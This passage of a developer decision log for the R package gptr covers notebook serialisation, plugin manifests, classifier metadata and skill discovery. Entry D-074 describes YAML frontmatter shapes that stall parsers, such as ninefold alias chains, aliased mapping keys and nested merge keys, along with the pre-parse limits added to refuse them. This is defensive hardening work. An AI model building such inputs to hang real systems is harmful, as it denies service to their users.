   lengths are parsed in one jsonlite call per 2,048 numbers, and the doubles of a list are
   formatted together: 100,000 floats serialise in 1.7 s, the plan literal took 5.4 s
   (`task6-timing.log`).
2. **Integers beyond 32 bits keep their digits.** jsonlite reads them as doubles, so the plan
   wrote `10000000000` back as `10000000000.0` and `-12345678901234567890` as
   `-1.2345678901234567e+19`, changing untouched outputs (contract 11.5: only `source` and
   `metadata.gptr` change; report 14 section 7 item 11 had left this open). When the text holds a
   run of ten or more digits after `[`, `,` or `:`, the number tokens outside strings are matched
   to the parsed numbers in document order and such integers carry their token (attribute
   `nb_json`), written back verbatim; nothing is marked when the counts disagree. A 6.9 MB
   notebook with a 300,000-escape string parses in 0.12 s (`task6-bigstring.log`).
3. **Text that is not an nbformat 4 notebook is a `gptr_error_doc_write` (`reason =
   "notebook"`).** The plan raised jsonlite's or base R's error for unparseable text or a JSON
   scalar, and read `nb$nbformat` with partial matching, so `{"nbformat_minor": 4, ...}` passed as
   version 4.
4. **Source is split as nbformat splits it, and read back line for line.** `nb_source_split()`
   follows nbformat's `split_lines()` (Python `str.splitlines(True)`: also `\r`, `\v`, `\f`,
   `\x1c`-`\x1e`, U+0085, U+2028, U+2029; report 14 section 2.2.3 noted the gap), so Jupyter's
   next save leaves an agent cell alone. `nb_cell_lines()` keeps a final empty line: the plan
   dropped it, so a block whose body ended with a blank line came back "user-edited" (its `sha`
   no longer matched).
5. **Each top-level call of a calling cell owns its own agent cell (contract 11.5).** The plan
   matched owners with `doc_run_owner(..., k = 1)` per call, so in a cell with `gptr("load data")`
   and `gptr("plot it")`, editing the second prompt claimed the first call's cell as stale and
   would overwrite it. The calling cell's calls now share its run of agent cells and are assigned
   one to one by Task 5's `doc_rmd_owner()` (D-070 item 3). A call nested in a function, loop or
   brace, or inside a marker block, owns no cell: `top_level = FALSE` (`in_block` set), and
   upsert refuses it (`reason = "not found"`). The plan wrote an agent cell for it.
6. **Inert cells round-trip exactly (G7 section 3.8, as D-070 item 5).** Every non-empty source
   line gets one `#~ ` and reviving removes exactly one; the plan left a user's own `#~ ` line
   unprefixed, so reviving changed it, and "revived" a live cell the same way. A cell already in
   the requested state is left alone, and a notebook in which nothing changes is returned as it
   was written rather than re-serialised.
7. **Notebooks before nbformat 4.5 get agent cells without `id`, and agent cells are also
   known by `metadata.gptr.id`.** Cell ids arrived with nbformat 4.5 (report 14 section 2.2.3
   verified the 4.5 schema; the 4.0-4.4 cell schemas define no `id`, which was not re-verified
   offline here), so an id in an older notebook makes it invalid for its declared version. 4.5
   notebooks are unchanged: the agent cell has `"id": "gptr-<id>"`. `nb_cell_ids()` gives
   `gptr-<id>` for a cell whose own id is not a `gptr-` id (none, or a fresh id from a save
   that upgraded the notebook to 4.5 and gave every cell one; from memory JupyterLab 3+ and
   Notebook 7 do this, not verified offline) and whose `metadata.gptr.id` is `<id>`, unless
   some cell carries `gptr-<id>` itself or an earlier cell already claimed it, so a copy of an
   agent cell (same metadata, its own id) stays an ordinary cell. Without the second case
   (review round 1) such an upgrade made the agent cell an ordinary cell: locate owned nothing,
   the next sync inserted a duplicate cell and undo found nothing. The cell keeps its id when
   rewritten or made inert (only `source` and `metadata.gptr` change). Every lookup by
   `gptr-<id>` (this task and the plan's Tasks 9-14) goes through `nb_cell_ids()`.
8. **`metadata.gptr` is read by its exact name and added in sorted order.** The fixture's calling
   cell has `metadata.gptr_test`; the plan's `$gptr` partially matches such a key, and an agent
   cell whose metadata held only `gptr_note` made locate fail with "subscript out of bounds". A
   `gptr` key added to existing metadata goes in nbformat's sorted position (the plan appended
   it).
Also: site, anchor and cell fields are read with `[[` (exact names, as D-064 item 3). In the
tests the fixtures are split by the test helper of Task 5 and the byte round trip compares the
serialised lines plus nbformat's final newline, because Task 4's `doc_read()`/`doc_write()` are
not implemented yet (they wait for P08). Later tasks must look agent cells up through
`nb_cell_ids()`/`nb_cell_meta()`, not `cell$id`/`cell$metadata$gptr` (the plan's Task 14
`doc_blocks_ipynb()` reads both directly, which misses agent cells without a `gptr-` id, in
4.0-4.4 notebooks or after an upgrade to 4.5 gave them fresh ids, and partially matches
`gptr_*` keys).

Validation: `progress/P15.md`, Task 6. The plan's 7 tests are unchanged apart from that fixture
reader and pass on the plan literal with the plan's 60 expectations; eight tests (48
expectations) were added, and each fails on the plan literal (16 failures, 3 errors;
`task6-adapt-red.log`). Review round 1 added a ninth (15 expectations) for item 7's upgraded
cells and copies; it failed 10 of them before the fix (`task6-fix1-red.log`). The fixture, the notebook after an upsert (non-ASCII, quotes, `</b>`,
`\f`, U+2028, `\r` and a final blank line in the body), the same cell made inert, a 4.4
notebook with an agent cell and the big-integer notebook before and after an upsert all equal
Python's `json.dumps(json.loads(x), indent=1, sort_keys=True, ensure_ascii=False,
separators=(",", ": ")) + "\n"`, and every source list equals `splitlines(True)` of its text
(`task6-python-fixture.log`, `task6-python-notebooks.log`). Final `^doc-formats$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 228 ]`, the same under `LC_ALL=C LANG=C`
(`task6-fix1-green.log`, `task6-fix1-green-clocale.log`).

## D-072 - P17 shared resource layer: a gptr plugin manifest may give its resource paths as an array, an unparseable rDepends version counts as missing, existing L0 helpers are reused (2026-10-04)

P17 Task 1's plan-literal `R/ext-plugins.R` was changed in three ways. Signatures, return shapes
and the plan's 15 tests are unchanged.

1. **Array paths in a gptr manifest.** `plugin_type_paths()` took a gptr plugin's `skills`,
   `prompts` or `agents` key only when `is.character()`; otherwise it used the default directory.
   Manifests are read with P01's `json_decode()` (`simplifyVector = FALSE`, contract section 6),
   which turns a JSON array into a list, so `"skills": ["a", "b"]` was silently replaced by
   `skills/`. A list is now read like the Claude bundle keys (each entry through `plugin_rel()`,
   escaping entries dropped with the `a path outside the plugin was ignored` diagnostic). The
   contract's documented string form (11.12) behaves as before.
2. **An unparseable `rDepends` version is missing.** `rdepends_missing()` called
   `package_version()` on the matched version text, which the pattern lets through in forms such
   as `1.` or `1..2`; that threw out of plugin resolution. Such an entry is now reported as
   missing (contract 11.13: manifest and frontmatter problems are diagnostics, never errors).
3. **Reuse and robustness.** `res_session_id()` delegates to P02's `ext_session_id()` and
   `res_inside()` to P01's `path_inside()` (identical rules, both L0). `res_match()` ignores `NA`
   candidates and de-duplicates an exact hit; `res_register()` skips the `NULL` that `res_spec()`
   returns for an invalid spec instead of logging a diagnostic with an `NA` kind.

Four regression tests appended to `tests/testthat/test-ext-plugins.R` after the plan's 15 lock
items 1-3. They fail against the plan-literal code (`[ FAIL 6 | WARN 0 | SKIP 0 | PASS 71 ]`), so
every later P17 count for this file is 13 higher (IC-74).

Validation: `progress/P17.md`, Task 1. `^ext-plugins$`: red
`[ FAIL 15 | WARN 0 | SKIP 0 | PASS 0 ]`, green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 67 ]` (plan
tests), then `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 80 ]` with the regression tests (review round 1);
lint clean.

## D-073 - P13 System 1 vectors: unknown calibration prints as unknown, combined answers never overstate calibration, as.data.frame and Summary take row.names and na.rm through ..., gptr_prob()'s example waits for gptr(), NA subscripts assign like base R and cached stays per element (2026-10-04)

P13 Task 1 (`R/s1-types.R`). The classes, attributes, constructors, `gptr_prob()` and the 18
`gptr_s1` methods are those of contract 5.2 and 6.6; five points differ from the plan literal.

1. **Calibration in the print footer (IC-74).** The plan's `s1_footer()` printed `calibrated` for
   every value except `FALSE`, so `meta$calibrated = NA` (P01's fake classifier, native Clef
   answers) would have claimed calibration. 07 section 3 requires output to "say unknown when
   calibration is unknown". The footer is now `<model> . calibrated . <date>` only for `TRUE`,
   `uncalibrated` for `FALSE` (emulation) and `calibration unknown` for `NA` or a missing field.
   Contract 5.2's example footer (`jev-1.13.0 . calibrated . 2026-09-29`) is unchanged.
2. **Method signatures without lint suppressions.** The plan put `# nolint: object_name_linter.`
   on the `row.names` and `na.rm` formals and used the bare `.Generic` symbol (an
   `object_usage_linter` warning). `as.data.frame.gptr_s1(x, ...)` now takes `row.names` from
   `...` (by name, else the first unnamed argument), `Summary.gptr_s1(...)` receives `na.rm` in
   `...` (group dispatch always passes it), and `Ops`/`Math`/`Summary` read the generic as
   `get(".Generic", envir = <method frame>, inherits = FALSE)`. Behaviour is unchanged; R CMD
   check's S3 consistency rules accept the `...` forms (`tools::checkS3methods()`).
3. **Example guard.** The 04 section 6.6 example needs P08's `gptr()`. Its `gptr()` call and
   `gptr_prob(d)` run under `@examplesIf exists("gptr", mode = "function")` (P06's convention), so
   the example runs offline now with that part skipped. For P08 and P13 Task 9: once `gptr()`
   exists the guarded part runs, and it needs Task 9's `classifier` route; an R CMD check
   between those two points fails on this example. Task 9 (plan acceptance 4b-1) must show the
   full example running.
4. **Calibration of combined answers (IC-74).** The plan's `c.gptr_s1()` kept the first part's
   call-level `meta` unchanged, so `c(<jev answer, calibrated = TRUE>, <Clef answer, NA>)` or
   `c(<jev>, <emulated, FALSE>)` printed `calibrated` for every element; `[<-` with another
   call's answer and `vctrs::vec_c()`/`vec_rbind()`/dplyr's `bind_rows()`, `if_else()`,
   `case_when()` and `coalesce()` (whose common prototype comes from `vec_ptype2()`) did the
   same. The new private `s1_meta_combine()` keeps the first part's `meta` but sets
   `calibrated` to `TRUE` only when every part is `TRUE`, to `FALSE` when any part is `FALSE`
   (emulation stays explicitly uncalibrated) and to `NA` otherwise; it stays absent when no part
   states it. `c.gptr_s1()`, `[<-` with a same-kind System 1 value (not a bare value, which is not
   a model answer, and not an empty subscript) and `vec_ptype2()` between two System 1 vectors use
   it. The other call-level fields (`model`, `engine`, `date`, ...) remain the first part's, as
   in the plan (contract 5.2 types them as single values and has no mixed-provenance form).
   Not covered: a direct `vctrs::vec_assign()` / `vec_slice<-` keeps `x`'s meta, since vctrs
   casts the value to `x`'s type and restores to `x` (the tidyverse verbs above do not take that
   path).
5. **NA subscripts and per-element `cached` (contract 5.2).** The plan's `[<-` mapped the
   subscript to positions with `pos[i]`, which keeps NA positions, so assigning a length-1 value
   through a subscript holding NA (`replace(d, mask, d[1])` with an NA in the mask,
   `d[c(NA, 2L)] = d[3]`) failed with "NAs are not allowed in subscripted assignments", where base
   R assigns nothing at the NA positions. `[<-` now finds the value row of every position by
   applying the same subscript to an index vector (`from[i] = seq_along(value)`), so NA, recycling,
   names and extension follow base R's own rules; an all-NA subscript merges no calibration.
   `[[<-` rejects an NA or multi-element subscript, as base R does (`gptr_error_invalid_argument`).
   The plan's `s1_meta_take()` did not extend a zero-length `cached` (`e = d[0]; e[2] = TRUE` left
   `cached = logical(0)` on a length-2 answer), and its vctrs proxy had a `cached` column only when
   `cached` was aligned, so `vctrs::vec_c()`, `vec_rbind()` or dplyr's `bind_rows()` of an answer
   with per-element `cached` and one without stopped with a vctrs internal error. A present
   `cached` of length 0 now extends with NA; every proxy carries `cached` (NA when unknown), and
   `vec_restore()` leaves it absent only when the target has none and no element knows it;
   `c.gptr_s1()` likewise fills NA for the parts without `cached` instead of dropping it (absent
   only when no part has it).

Validation: `progress/P13.md`, Task 1. `^s1-types$`: red `[ FAIL 12 | WARN 0 | SKIP 0 | PASS 0 ]`,
green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 102 ]`; lint clean; a sabotage of item 2 fails the three
guarded expectations. Item 4 (review round 1): red `[ FAIL 15 | WARN 0 | SKIP 0 | PASS 112 ]`,
green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 127 ]`. Item 5 (review round 2): red
`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 129 ]`, green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 161 ]`.

## D-074 - P17 skills: an NA spelling in SKILL.md never stops discovery, string keys keep R yaml's .na spellings as text, a relative skills.paths entry is a trust-gated project root, a TEMPORARY test-side trust.get until P08 Task 2 (P08 Task 2 MUST remove it), YAML aliases never expand without bound, an unreadable file never warns, a ~name skills.paths entry is project content, a name must match to its last character (P02's name rules now anchor with \z), and frontmatter text that would make yaml slow is refused before yaml runs (2026-10-04)

P17 Task 2 (`R/skill-discover.R`), review rounds 1 to 6. The plan-literal code changed in
items 1, 2 and 4-9 (item 8 also changes P02's `R/ext-specs.R`), and the plan's test file gained
a temporary helper (item 3). Exported signatures, return shapes and the plan's 8 tests are
unchanged.

1. **`skill_parse()` never throws.** R yaml reads `.na.character`, `.na`, `.na.integer` and
   `.na.real` as `NA`. An `NA` name or description passed the plan's `is.character()`,
   `length() == 1L` and `nzchar()` checks (`nzchar(NA)` is `TRUE`), and the next
   `if (nchar(...) > n)` stopped with "missing value where TRUE/FALSE needed". `skill_collect()`
   does not guard the parse, so one such file in any root (a cloned repository's
   `.claude/skills`, untrusted) made the whole `gptr_skills()` call fail. Contract 11.13 and the
   `skill` row of section 10 require "diagnostics, never errors" and "skipped with a
   diagnostic". An `NA` description is now "description is required", and an `NA` name falls
   back to the directory name. The plan's body moved unchanged into the private
   `skill_parse_md(path, diag)`, and `skill_parse(path)` wraps it: any other error is a
   `builtin:skills` diagnostic (`<path>: cannot parse the skill: <message>`) and `NULL`.
   Interrupts are not caught.
2. **R yaml's `.na` spellings are kept as text (IC-71, Task 1 code).** IC-71 says the string
   keys (`name`, `description`, `version`, `model`, `tools`, `argument-hint`) "keep their source
   text". Task 1's `fm_raw_tags` (`R/ext-plugins.R`, plan lines 362-365) listed the YAML 1.1
   tags but not R yaml's `str#na`, `bool#na`, `int#na` and `float#na`, so these keys could
   still come back as `NA`. The four tags were added. `name: .na.character` is now the text
   `.na.character`; the `skill` kind refuses it, so the skill is skipped with a diagnostic.
   `description: .na.character` is kept as written. Other keys keep their typed values
   (`license: .na.character` is still `NA`). This also covers the agent files and templates of
   Tasks 6-7, which use the same frontmatter reader.
3. **TEMPORARY test-side `trust.get`.** The plan test "gptr_skills lists project and user skills;
   the project wins a name" calls `local_project(trust = TRUE)`. Without P08 that only writes
   `trust.json`, and `trust_ok()` reads trust only through P08's `trust.get` service (IC-33).
   `tests/testthat/test-skill-discover.R` therefore defines `local_trust_record()` and calls it
   once in that test. While `ext_service_has("trust.get")` is `FALSE`, it binds a `trust.get`
   for that test only (restored by `withr::defer()`), answering from the `trust.json` record
   keyed by `path_key()`. Once a real service is registered it does nothing. Nothing in `R/`
   stubs P08. **P08 Task 2 (project trust and the `trust.get` service) MUST delete
   `local_trust_record()` (its comment, definition and the one call) and show that test passing
   against the real service.** IC-52's trust fingerprint does not cover `skills/`, so the
   plan-literal test should then pass unchanged. The coordinator should add this to
   `HANDOFF.md` (cross-plan obligations).
4. **A relative `skills.paths` entry is a project root (IC-52, contract 6.3; review round 2).**
   The plan's `skill_setting_paths()` resolves a relative entry against `project_root()`, and
   `skill_roots()` put every `skills.paths` directory in the user group (rank 3, `user`,
   trusted). A relative entry names a directory of whichever project is open, so in an
   untrusted project its skills were listed as `user` with `visible = TRUE`, and Task 4's
   registration (`df$trusted & origin != "plugin"`) would put them in the T1 catalog. That
   breaks IC-52 ("Only skills from user directories, installed packages and trusted projects
   enter the T1 catalog") and contract 6.3 (project resources show `project (untrusted)`).
   `skill_setting_paths()` now returns `list(project, user)`: relative entries (resolved
   against the project root, including ones that climb out with `..`) join the project group
   after `.gptr/skills`, `.agents/skills` and `.claude/skills` (rank 1, origin `project`,
   registry source `project`, label and trust from `trust_ok()`); absolute and `~` entries stay
   user directories (rank 3). An `NA` entry is dropped instead of reaching `path_norm()`. In a
   trusted project a relative entry now outranks a user skill of the same name, as the other
   project roots do.
5. **YAML aliases never expand without bound (contract 6.3 and 11.13, IC-52; review round 3;
   Task 1 code too).** R yaml keeps an aliased node as one shared R object, so a SKILL.md of a
   few hundred bytes (`x0: &a0 [a, ..., i]`, `x1: &a1 [*a0 x 9]`, ... `x7`, then
   `disable-model-invocation: *a7`) loads at once but expands about ninefold per level. The
   plan's `as.character()` of `disable-model-invocation` and `fm_chr_list()`'s `unlist()` of
   `allowed-tools` expanded it: one such file took 186 s at seven levels (and would take about
   30 minutes at eight) and blocked `gptr_skills()`, which walks untrusted project skills too.
   No error is raised, so item 1's `tryCatch()` cannot help. Three guards:
   - `fm_yaml()` (`R/ext-plugins.R`) checks the parsed value with the new `fm_size_ok()`, a
     level-by-level count with vectorised steps that stops at its limit. YAML that expands to
     more than 10,000 values or 1,000,000 string bytes beyond the size of its own text is a
     failed parse: `meta = NULL` and the error string
     `invalid YAML frontmatter: too large once its aliases are expanded` (so `skill_parse()`
     skips the skill with that diagnostic). Text without aliases always fits, and the check
     covers every frontmatter reader (skills, templates, agent files).
   - `fm_chr_list()` returns `NULL` for a value that is not flat (new `fm_flat()`: `NULL`, an
     atomic vector, or a list of atomic scalars and `NULL`s) instead of flattening it.
     `skill_parse()` then adds the diagnostic
     `allowed-tools must be a list of tool names; it was ignored`.
   - `skill_parse()` reads `disable-model-invocation` only as a logical scalar or a text scalar
     equal to `true` in any case; any other value is `FALSE` and is never converted to text.

   These guards run after yaml has parsed. Review round 5 found one shape that yaml expands
   itself: an aliased collection used as a mapping key (`? *a7`, `*a7 : 1`, `{*a7 : 1}`), which
   yaml turns into text inside `yaml.load()`. A 453-byte chain of seven levels took 193 s, before
   `fm_size_ok()` could look at anything. Item 9's limit of 4 references to anchors, checked
   before yaml runs, now bounds every alias expansion. `fm_size_ok()` stays for what 4
   references can still expand to (8,000 values referenced 4 times is refused).
6. **An unreadable file is a diagnostic only (contract 6.3, 11.13; review round 3; Task 1
   code).** `read_utf8()`'s `file()` warns ("Permission denied") before it fails, and the
   warning escaped `frontmatter_read()`'s `tryCatch(error = )`, so `gptr_skills()` printed a
   base R warning on top of the `cannot read the file` diagnostic. The read is now wrapped in
   `suppressWarnings()`.
7. **Only `~` and `~/` (or `~\`) `skills.paths` entries are home directories (IC-52, IC-63;
   review round 3).** Item 4 classed every entry starting with `~` as a user root, but
   `path_norm()` expands only `~` and `~/` (IC-63), so `~bob/skills` was resolved against the
   working directory, inside the project, and listed project content as `user` and visible in
   an untrusted project. Other `~name` entries are now relative entries: project roots,
   resolved against the project root and trust-gated like the rest of item 4.
8. **A skill name must match `^[a-z0-9][a-z0-9-]*$` to its last character (contract 11.13;
   review round 4; P02 code too).** P02's `kind_check_skill()` tested the name with
   `grepl(..., perl = TRUE)`, and PCRE's `$` also matches before a final newline, so a name
   ending in `"\n"` passed. YAML gives exactly that for `name: |` and `name: >` (block scalars
   keep one final newline) and for `name: "x\n"`, and a directory name can end in a newline
   too, so such a skill was listed and visible with a name that is not a valid skill name.
   Two changes:
   - `skill_parse()` refuses the name itself: a name outside `^[a-z0-9][a-z0-9-]*\z` (PCRE,
     `\z` = the very end, matched on bytes) gives the diagnostic
     `<path>: name must match ^[a-z0-9][a-z0-9-]*$ to its last character; the skill was skipped`
     and `NULL`, after Pi's name warnings. A name the `skill` kind refuses (`Bad_Name`) is now
     skipped by this check, with this diagnostic instead of `res_spec()`'s `invalid_spec` one.
   - The root cause in P02 (`R/ext-specs.R`, plan complete, no active lane): every name and
     version rule written with `perl = TRUE` and `$` now ends with `\z` (provider id, tool name
     and namespace, skill, command, setting, env_alias, kind specs, `kind_define()` names, and
     IC-74's `decision.server_min`). The error messages still show the rule with `$`. No other
     P02 behaviour changes. `progress/P02.md` records it.
9. **Frontmatter text that would make yaml slow is refused before yaml runs (contract 6.3 and
   11.13, IC-52; review rounds 4 to 6; Task 1 code).** `yaml::yaml.load()` does work that grows
   faster than its input, and `fm_yaml()` parses twice (typed and raw) before round 3's
   `fm_size_ok()` can look at the result. Measured on this machine (two loads, as `fm_yaml()`
   did): 32,000 nested `[` in 64 KB took 6.3 s, 16,000 in 32 KB 1.6 s, 16,000 nested `- ` in
   32 KB 1.0 s, and a 17 KB map that merges a 1,000-key alias 2,000 times with `<<` took
   11.0 s; the cost of flow nesting grows with the square of the depth, so a 1 MB SKILL.md in an
   untrusted project would take about half an hour. The new `fm_text_problem()`
   (`R/ext-plugins.R`) checks the text first, and `fm_yaml()` returns `meta = NULL` with one of
   these error strings, so `skill_parse()` skips the skill with that diagnostic and lists its
   siblings:
   - more than 16,384 bytes: `invalid YAML frontmatter: too large (more than 16384 bytes)`;
     real frontmatter is a few kilobytes (a skill description is at most 1,024 characters).
     Rounds 4 and 5 allowed 32,768 bytes; round 6 halved it because yaml checks each new map
     key against the others, so a map's cost grows with the square of its size: the largest
     plain map of 32 KB took 0.38 to 0.43 s through `fm_yaml()` and one of 16 KB takes 0.10 s;
   - more than 1,000 `[` and `{` characters in all (a bound on the flow depth that quoted
     brackets cannot hide), or more than 64 `-` or `?` block entries in a row: `invalid YAML
     frontmatter: too deeply nested (...)`;
   - more than 4 references to the anchors the text defines: `invalid YAML frontmatter: too many
     aliases (more than 4 references to anchors)`. A reference is any `*name` whose `name` is
     also written as `&name` somewhere in the text. libyaml's anchor names are `[0-9A-Za-z_-]+`,
     so both are read as that run. No position rule applies, so no key syntax, merge spelling or
     separator (such as U+2028) can hide one. Markdown such as `*args` or `**bold**` counts only
     when it names an anchor;
   - more than 4 merge keys, tags and references in all (round 6): `invalid YAML frontmatter:
     too many merge keys, tags and aliases (more than 4 in all)`. R yaml merges a map under a
     plain `<<` key, under a key with any tag that names merge (`!!merge`, `!merge`,
     `!<merge>`, `!<tag:yaml.org,2002:merge>`, percent-encoded spellings, and `! <<`), and
     under an alias of an anchored merge key (`k: &m <<`, then `{*m : {...}}`). A tag can only
     start a node, so the count takes every `<<`, every `!` that follows the start of the text,
     an ASCII character other than a letter, a digit or `!`, one of the line breaks U+0085,
     U+2028 and U+2029, or a byte order mark (each probed: a `!` right after a letter, an anchor,
     an alias or a closing quote is plain text or a YAML error), and the references of the
     previous rule. So yaml merges at most 4 times. Prose such as `Wow! Use it! Really!!`
     counts nothing; `(!)` counts one. A quoted `"<<"` does not merge but is still counted, and
     a `%TAG` directive cannot occur, because its `---` line would end the frontmatter.

   Round 4 applied the alias limit only when a `<<:` merge key appeared on one line. Review round
   5 found two ways around that, both checked here first:
   - An aliased collection used as a mapping key, in any key syntax. yaml turns the key into text
     and costs about ninefold per chain level: 345 bytes took 0.18 s, 399 bytes 3.8 s and 453
     bytes 193 s, with no merge key and no deep nesting.
   - A merge spelt `? <<` / `: [*b, ...]`, which R yaml still merges: 17 KB took 11.9 s. While
     fixing this, the merge was also found to work with `!!merge x:` and with the
     percent-encoded `!<tag:yaml.org,2002:%6Derge> x:`, which no text search for `<<` or
     `merge` can catch.

   Counting references by name catches all of these.

   The patterns are ASCII and matched on bytes, so text that is not valid UTF-8 neither warns
   nor errors. After round 4's change the four documents above were refused in at most 0.012 s,
   and the largest map it accepted (3,600 keys, 31 KB) parsed in 0.11 s. Text that passes may still
   hold brackets inside quoted strings; only documents with more than 1,000 of them are
   refused. After round 5, each of the reviewer's reproductions is refused in at most 0.01 s (the
   chains of 5, 6 and 7 levels in all three key forms, and `? <<` and `!!merge` with 250 to 2,000
   references).

   Round 5 also claimed that the costliest accepted text was a 3,000-key map merged with 4
   references, at 0.28 s. Review round 6 disproved that: merges nested inside each other need no
   alias at all. R yaml copies and checks the merged map at every level, so the cost grows with
   the depth times the square of the map's size, and the result is one flat map that
   `fm_size_ok()` accepts. Examples:
   - `m: ` + 499 x `{<<: ` + a 6,100-key map, 32,563 bytes with 500 `{`, no `*` and no `- ` run,
     took 116 s through `fm_yaml()`;
   - a 15 KB SKILL.md of 200 levels and 3,000 keys and a 24 KB one of 120 block `<<:` lines
     made `gptr_skills("project")` take 22.6 s with no diagnostic;
   - the same merge with no `<<` at all, written with the merge tags above.
   Round 6 added the merge rule and the 16,384-byte limit. Afterwards (`task2-fix6-probe.log`):
   - the reviewer's documents are refused in at most 0.012 s;
   - nested `<<` and nested `!!merge`, `!merge`, `!<merge>` and `!<tag:yaml.org,2002:merge>`
     filling 16 KB, and an anchored `<<` aliased 4 times under 3 more `<<`, are each refused in
     at most 0.002 s;
   - the reviewer's end-to-end project is listed in 0.09 s (`task2-fix6-e2e.log`): only `good`,
     with the 24 KB skill diagnosed as too large and the 15 KB one as too many merge keys.
   The costliest texts still accepted fill 16 KB with a map merged 4 times, nested: 0.40 s
   through `fm_yaml()`, or 0.59 s when the first parse fails and the repaired text is parsed
   again (three loads). An anchored `<<` aliased 3 times takes 0.31 s, one `<<` over a sequence
   of 30 to 900 maps at most 0.074 s, and the plain 16 KB map 0.10 s. The machine's load
   average was about 7 during these runs.

Regression tests lock items 1, 2 and 4-9: twelve appended to
`tests/testthat/test-skill-discover.R`, six to `tests/testthat/test-ext-plugins.R` and one to
`tests/testthat/test-ext-specs.R` (P02, 20 expectations). Round 5 also changed the fixtures of
round 3's alias tests in both P17 files: their chains now exceed the limit of 4 references, so
fixtures within the limit show `fm_size_ok()` still refusing the expansion. Round 6 changed
three earlier fixtures without changing their counts:
- round 4's accepted 30 KB note is now 15 KB, and its refused text is 20 KB, between the old
  and new limits;
- round 4's deep skill has 5,000 `[` (it would now be too large at 15,000);
- round 5's Markdown document merges 2 references instead of 4 (merge keys now count with them).
Every later P17 count for `test-skill-discover.R` is 64 higher (10 from round 1, 10 from round 2,
19 from round 3, 13 from round 4, 5 from round 5, 7 from round 6): Task 3's red 36 -> 100,
64 -> 128, 99 -> 163, and Task 12's combined count 260 -> 324. Every later count for
`test-ext-plugins.R` is 109 higher (D-072's 13, plus 6 from round 1, 10 from round 3, 17 from
round 4, 33 from round 5 and 30 from round 6): 82 -> 191, 133 -> 242, 166 -> 275, 184 -> 293.
Acceptance 1 becomes 617, acceptance 2b 163, acceptance 3a 293 and acceptance 4c 456 (IC-74).
The round-4 test of a directory name ending in a newline skips on Windows and on a file system
that refuses the name, like round 3's unreadable-file test.

Validation: `progress/P17.md`, Task 2, review rounds 1 to 6. Round 1 red: `^skill-discover$`
`[ FAIL 2 | WARN 0 | SKIP 0 | PASS 33 ]` (both new tests stop with the `NA` error), and
`^ext-plugins$` `[ FAIL 4 | WARN 0 | SKIP 0 | PASS 82 ]`. Green: `[ FAIL 0 | WARN 0 | SKIP 0 |
PASS 43 ]` and `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 86 ]`. With item 2 reverted, the
`gptr_skills()` regression test still fails (`[ FAIL 4 | WARN 0 | SKIP 0 | PASS 39 ]`). Round 2
(item 4) red: `^skill-discover$` `[ FAIL 7 | WARN 0 | SKIP 0 | PASS 46 ]` (the relative entry
read `user`, rank 3, trusted, visible); green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 53 ]`. Round 3
(items 5-7) red: `^skill-discover$` `[ FAIL 11 | WARN 0 | SKIP 0 | PASS 61 ]` after 3 min 31 s
(the seven-level file was listed, nested values were expanded, `list("true")` read as `TRUE`,
the unreadable file warned, `~bob/skills` read `user` and visible), and `^ext-plugins$`
`[ FAIL 6 | WARN 0 | SKIP 0 | PASS 90 ]`; green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 72 ]` and
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 96 ]`. With only the `fm_size_ok()` checks removed, the
alias tests still fail (`[ FAIL 6 | WARN 0 | SKIP 0 | PASS 162 ]`).
Round 4 (items 8 and 9) red: `^(skill-discover|ext-plugins|ext-specs)$`
`[ FAIL 24 | WARN 0 | SKIP 0 | PASS 467 ]` (the three newline names were listed, the 40 KB
text reached yaml, the deep and huge skills were listed, and P02 accepted every name and
version ending in a newline). With the P02 change alone (before the pre-scan), the four
`skill_parse()` name diagnostics and the three deep/huge expectations still fail
(`^(skill-discover|ext-specs)$` `[ FAIL 7 | WARN 0 | SKIP 0 | PASS 384 ]`); with everything but
the P02 change, the P02 test fails (`[ FAIL 11 | WARN 0 | SKIP 0 | PASS 380 ]`). Green:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 504 ]` (skill-discover 85, ext-plugins 113, ext-specs 306);
the whole suite `[ FAIL 1 | WARN 0 | SKIP 11 | PASS 13631 ]`, the failure being the
pre-existing `test-zzz.R:301` of P15's `R/doc-blocks.R`. Lint clean.
Round 5 (item 9's limit on references to anchors) red: `^(skill-discover|ext-plugins)$`
`[ FAIL 18 | WARN 0 | SKIP 0 | PASS 218 ]`. The eleven key, merge and separator forms reached
yaml or got the old merge message. The 4-reference document with Markdown asterisks was refused
as a merge. The 7-level chain still got only the post-parse message, and the two untrusted skills
were skipped without the new diagnostic. Green: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 236 ]`
(skill-discover 90, ext-plugins 146); ext-specs is unchanged at 306. The whole suite gave
`[ FAIL 16 | WARN 0 | SKIP 5 | PASS 13879 ]`, and none of the 16 comes from this task:
- the pre-existing `test-zzz.R:301`;
- five in P13's in-progress `test-s1-cache.R`;
- ten order-dependent errors in `secret_late_check()` (`test-provider-registry.R` 9,
  `test-session-budget.R` 1). They are left behind by the provider end-to-end tests that the
  P07 lane's untracked `R/prompt-cache.R` no longer skips. The two files pass alone (968) and
  together with this task's files (1510).
Lint clean.
Round 6 (item 9's merge rule and 16,384-byte limit) red: `^(skill-discover|ext-plugins)$`
`[ FAIL 17 | WARN 0 | SKIP 0 | PASS 243 ]`. The 20 KB text reached yaml, the eleven merge forms
reached yaml, the 20 KB skill was listed, and the three merge skills were skipped without the new
diagnostic. Without the tag count the test fails 9 times; without the references in the budget,
2 times. Green: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 273 ]` (skill-discover 97, ext-plugins 176);
ext-specs is unchanged at 306, and the three together give 579. The whole suite gave
`[ FAIL 42 | WARN 0 | SKIP 5 | PASS 14073 ]`, and none of the 42 comes from this task:
`test-zzz.R:301`; 24 in P13's untracked, in-progress `test-s1-emulate.R`; 7 in P07's
in-progress `test-prompt-cache.R`; and the ten order-dependent `secret_late_check()` errors of
round 5. Lint clean.

